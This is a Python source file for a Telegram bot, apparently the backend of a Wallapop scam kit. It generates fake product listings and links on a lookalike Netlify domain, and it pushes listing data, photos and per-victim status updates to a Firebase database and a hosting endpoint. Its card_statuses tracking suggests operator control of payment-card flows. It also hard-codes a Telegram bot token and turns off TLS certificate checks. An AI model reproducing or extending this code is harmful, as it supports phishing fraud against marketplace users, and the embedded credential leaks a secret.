#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import json
import html
import random
import string
import logging
import threading
import time
import io
import http.server
import socketserver
from datetime import datetime
from typing import Dict, Any

import requests

card_statuses: Dict[str, str] = {}

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# Configuración básica
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO
)
logger = logging.getLogger("WallapopBot")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TOKEN_FILE = os.path.join(BASE_DIR, "token.txt")
CONFIG_FILE = os.path.join(BASE_DIR, "config.json")
DB_JSON_FILE = os.path.join(BASE_DIR, "products.json")
DB_JS_FILE = os.path.join(BASE_DIR, "products.js")

DEFAULT_TOKEN = "8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM"

def load_token() -> str:
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                cfg = json.load(f)
                if cfg.get("token"):
                    return cfg["token"].strip()
        except Exception:
            pass
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, "r", encoding="utf-8") as f:
                t = f.read().strip()
                if t:
                    return t
        except Exception:
            pass
    return os.getenv("BOT_TOKEN", DEFAULT_TOKEN).strip()

def load_config() -> Dict[str, Any]:
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                cfg = json.load(f)
                return cfg
        except Exception:
            pass
    return {
        "token": DEFAULT_TOKEN,
        "port": 3000,
        "publicUrl": "https://wallaaaa.netlify.app",
        "base_url": "https://wallaaaa.netlify.app/a/"
    }

def save_config(cfg: Dict[str, Any]):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, ensure_ascii=False, indent=2)

FIREBASE_URL = "https://callcentery-2315b-default-rtdb.firebaseio.com"

def get_clean_domain() -> str:
    cfg = load_config()
    base = cfg.get("publicUrl") or cfg.get("base_url") or ""
    base = base.strip().rstrip("/")
    if "/a" in base:
        base = base.split("/a")[0].rstrip("/")
    return base

def upload_photo_to_hosting(photo_bytes: bytes, file_name: str, tg_path: str = "") -> str:
    domain = get_clean_domain()
    cdn_url = ""
    if tg_path and TOKEN:
        clean_tg = f"api.telegram.org/file/bot{TOKEN}/{tg_path}"
        import urllib.parse
        cdn_url = f"https://wsrv.nl/?url={urllib.parse.quote(clean_tg)}"

    b64_img = ""
    # 1. Guardar copia local en web/photos y photos/ si existe
    try:
        for pdir in [os.path.join(BASE_DIR, "web", "photos"), os.path.join(BASE_DIR, "photos")]:
            os.makedirs(pdir, exist_ok=True)
            with open(os.path.join(pdir, file_name), "wb") as f:
                f.write(photo_bytes)
    except Exception as e:
        logger.warning(f"Error guardando foto local: {e}")

    # 2. Guardar foto permanente en Firebase Realtime Database
    try:
        import base64
        b64_img = "data:image/jpeg;base64," + base64.b64encode(photo_bytes).decode("utf-8")
        pkey = file_name.replace(".", "_")
        fb_photo = {
            "id": file_name,
            "base64": b64_img,
            "tg_url": f"https://api.telegram.org/file/bot{TOKEN}/{tg_path}" if tg_path else "",
            "cdn_url": cdn_url or f"/photos/{file_name}",
            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        requests.put(f"{FIREBASE_URL}/wallapop/photos/{pkey}.json", json=fb_photo, timeout=8)
    except Exception as e:
        logger.warning(f"Error guardando foto en Firebase: {e}")

    if b64_img:
        return b64_img
    if cdn_url:
        return cdn_url
    return f"/photos/{file_name}"

def notify_hosting_status(target_id: str, status: str):
    try:
        st_data = {"status": status, "id": target_id, "ts": int(time.time())}
        requests.put(f"{FIREBASE_URL}/wallapop/status/{target_id}.json", json=st_data, timeout=5)
        requests.put(f"{FIREBASE_URL}/wallapop/status/latest.json", json=st_data, timeout=5)
    except Exception as e:
        logger.warning(f"Error actualizando status en Firebase: {e}")

    domain = get_clean_domain()
    if not domain or "localhost" in domain or "127.0.0.1" in domain:
        return
    try:
        url = f"{domain}/api.php?action=set_status&id={target_id}&status={status}"
        r = requests.get(url, timeout=6, verify=False)
        if r.status_code == 200:
            logger.info(f"✅ Hosting actualizado: id={target_id} -> status={status}")
        else:
            logger.warning(f"Aviso hosting status ({r.status_code}): {r.text[:100]}")
    except Exception as e:
        logger.warning(f"Error notificando estado al hosting: {e}")

def sync_db_to_hosting(db_to_sync: Dict[str, Any]):
    try:
        prods = db_to_sync.get("products", db_to_sync)
        if isinstance(prods, dict) and "products" in prods:
            prods = prods["products"]
        requests.put(f"{FIREBASE_URL}/wallapop/products.json", json=prods, timeout=6)
        if db_to_sync.get("activeId"):
            requests.put(f"{FIREBASE_URL}/wallapop/activeId.json", json={"activeId": db_to_sync["activeId"]}, timeout=4)
    except Exception as e:
        logger.warning(f"Error sincronizando productos con Firebase: {e}")

    domain = get_clean_domain()
    if not domain or "localhost" in domain or "127.0.0.1" in domain:
        return
    try:
        sync_url = f"{domain}/api.php?action=sync_products"
        payload = {
            "products": db_to_sync.get("products", {}),
            "activeId": db_to_sync.get("activeId", "")
        }
        r = requests.post(sync_url, json=payload, timeout=8, verify=False)
        if r.status_code == 200:
            logger.info("✅ Base de datos de productos sincronizada con el hosting.")
    except Exception as e:
        logger.warning(f"No se pudo sincronizar productos con hosting: {e}")

def load_db() -> Dict[str, Any]:
    if os.path.exists(DB_JSON_FILE):
        try:
            with open(DB_JSON_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    # Producto inicial de ejemplo
    init_id = "AD8351003"
    init_prod = {
        "id": init_id,
        "titulo": "Lote Perfumes Mujer 14 Uds.",
        "precio": 250,
        "precioArticulo": 250,
        "descripcion": "Lote de 14 perfumes de mujer, todos precintados. Se vende el lote completo, no se hacen separaciones.",
        "nombre": "Sofía Chamizo",
        "direccion": "Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024",
        "articulo": "Lote Perfumes Mujer 14 uds.",
        "fotos": []
    }
    db = {"products": {init_id: init_prod}, "activeId": init_id}
    save_db(db)
    return db

def save_db(db: Dict[str, Any]):
    try:
        with open(DB_JSON_FILE, "w", encoding="utf-8") as f:
            json.dump(db, f, ensure_ascii=False, indent=2)
        with open(DB_JS_FILE, "w", encoding="utf-8") as f:
            f.write("window.SERVER_DB = " + json.dumps(db, ensure_ascii=False, indent=2) + ";\n")
        web_dir = os.path.join(BASE_DIR, "web")
        if os.path.exists(web_dir):
            with open(os.path.join(web_dir, "products.json"), "w", encoding="utf-8") as f:
                json.dump(db, f, ensure_ascii=False, indent=2)
            with open(os.path.join(web_dir, "products.js"), "w", encoding="utf-8") as f:
                f.write("window.SERVER_DB = " + json.dumps(db, ensure_ascii=False, indent=2) + ";\n")
            data_dir = os.path.join(web_dir, "data")
            if os.path.exists(data_dir):
                with open(os.path.join(data_dir, "productos.json"), "w", encoding="utf-8") as f:
                    json.dump(db, f, ensure_ascii=False, indent=2)
                if db.get("activeId"):
                    with open(os.path.join(data_dir, "activo.txt"), "w", encoding="utf-8") as f:
                        f.write(str(db["activeId"]))
        # Sincronizar en segundo plano con el hosting
        threading.Thread(target=sync_db_to_hosting, args=(db,), daemon=True).start()
    except Exception as e:
        logger.error(f"Error guardando base de datos: {e}")

config = load_config()
db = load_db()
wizards: Dict[int, Dict[str, Any]] = {}

def gen_id() -> str:
    # Formato estilo AD + 7 dígitos como en el ejemplo #AD8351003
    nums = "".join(random.choices(string.digits, k=7))
    return f"AD{nums}"

def fmt_eur(val) -> str:
    try:
        n = float(val)
        if n.is_integer():
            return f"{int(n)} €"
        return f"{n:,.2f} €".replace(",", "X").replace(".", ",").replace("X", ".")
    except Exception:
        return f"{val} €"

def get_link(prod_id: str) -> str:
    cfg = load_config()
    base = cfg.get("publicUrl") or cfg.get("base_url") or "https://wallaaaa.netlify.app"
    base = base.rstrip("/")
    if "localhost" in base or "127.0.0.1" in base:
        base = "https://wallaaaa.netlify.app"
    if base.endswith("/a"):
        clean_base = f"{base}/{prod_id}"
    else:
        clean_base = f"{base}/a/{prod_id}"
    return clean_base

